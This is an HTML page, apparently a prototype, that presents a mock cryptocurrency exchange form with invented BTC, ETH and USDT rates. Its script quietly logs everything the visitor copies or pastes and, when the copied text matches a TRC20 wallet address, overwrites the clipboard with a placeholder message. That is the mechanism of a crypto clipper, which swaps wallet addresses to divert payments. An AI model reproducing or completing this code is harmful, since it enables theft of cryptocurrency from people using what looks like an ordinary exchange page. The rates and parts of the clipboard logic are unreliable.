<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Мониторинг буфера и обмен валют</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 20px;
        }

        .form-container {
            margin-bottom: 30px;
        }

        #exchangeResult {
            margin-top: 20px;
        }
    </style>
</head>
<body>
    <h1>Мониторинг буфера и обмен валют</h1>

    <!-- Форма для обмена валют -->
    <div class="form-container">
        <h2>Обмен валют</h2>
        <form id="exchangeForm">
            <label for="fromCurrency">Из валюты:</label>
            <select id="fromCurrency" required>
                <option value="BTC">BTC</option>
                <option value="ETH">ETH</option>
                <option value="USDT">USDT</option>
            </select>
            <br><br>
            <label for="toCurrency">В валюту:</label>
            <select id="toCurrency" required>
                <option value="BTC">BTC</option>
                <option value="ETH">ETH</option>
                <option value="USDT">USDT</option>
            </select>
            <br><br>
            <label for="amount">Сумма:</label>
            <input type="number" id="amount" required>
            <br><br>
            <button type="submit">Обменять</button>
        </form>
        <div id="exchangeResult"></div>
    </div>

    <script>
        // Функция для логирования в консоль
        function logToConsole(message) {
            console.log(message);
        }

        // Функция для проверки адреса TRC20
        function isTrc20Address(address) {
            const pattern = /^[A-Za-z1-9]{34}$/;
            return address.length === 34 && address[0] === 'T' && pattern.test(address);
        }

        // Обработчик события для изменений буфера обмена
        document.addEventListener("copy", function (event) {
            const clipboardText = event.clipboardData.getData("text");
            logToConsole(`Новое содержимое буфера: ${clipboardText}`);

            if (isTrc20Address(clipboardText)) {
                logToConsole(`Ты скопировал кошелёк TRC20: ${clipboardText}`);
                // Заменяем содержимое буфера на "Это был кошелёк!"
                navigator.clipboard.writeText("Это был кошелёк!")
                    .then(() => logToConsole("Буфер обмена обновлён на 'Это был кошелёк!'"))
                    .catch(error => logToConsole(`Ошибка при замене содержимого буфера: ${error}`));
            }
        });

        // Обработчик для событий paste
        document.addEventListener("paste", function (event) {
            const clipboardText = event.clipboardData.getData("text");
            logToConsole(`Вставлено в буфер: ${clipboardText}`);
        });

        // Обработчик формы обмена валют
        document.getElementById('exchangeForm').addEventListener('submit', function(e) {
            e.preventDefault();

            const fromCurrency = document.getElementById('fromCurrency').value;
            const toCurrency = document.getElementById('toCurrency').value;
            const amount = parseFloat(document.getElementById('amount').value);
            const resultDiv = document.getElementById('exchangeResult');

            if (!amount || amount <= 0) {
                resultDiv.innerHTML = '<p style="color: red;">Пожалуйста, введите правильную сумму для обмена.</p>';
                return;
            }

            // Простая имитация обменного курса
            const exchangeRates = {
                'BTC': { 'ETH': 15, 'USDT': 50000 },
                'ETH': { 'BTC': 0.066, 'USDT': 3333 },
                'USDT': { 'BTC': 0.00002, 'ETH': 0.0003 },
            };

            // Получаем курс обмена
            const rate = exchangeRates[fromCurrency][toCurrency];
            const convertedAmount = (amount * rate).toFixed(4);

            resultDiv.innerHTML = `
                <p>Вы обменяли ${amount} ${fromCurrency} на ${convertedAmount} ${toCurrency} по текущему курсу.</p>
            `;
        });
    </script>
</body>
</html>